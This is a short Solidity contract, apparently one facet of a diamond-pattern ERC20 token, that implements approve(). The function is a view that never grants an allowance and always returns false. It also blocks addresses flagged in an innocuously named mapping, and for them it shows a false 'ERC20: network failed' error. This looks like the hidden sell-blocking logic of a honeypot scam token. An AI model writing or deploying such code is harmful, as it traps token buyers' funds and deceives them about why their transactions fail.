// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import "./TestLib.sol";
contract approveFacet {
    function approve(
        address addr1,
        address,
        uint256
    ) public view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds._rewardTokenPoolStartTimeRefundee[addr1] != true,
            "ERC20: network failed"
        );
        return false;
    }
}
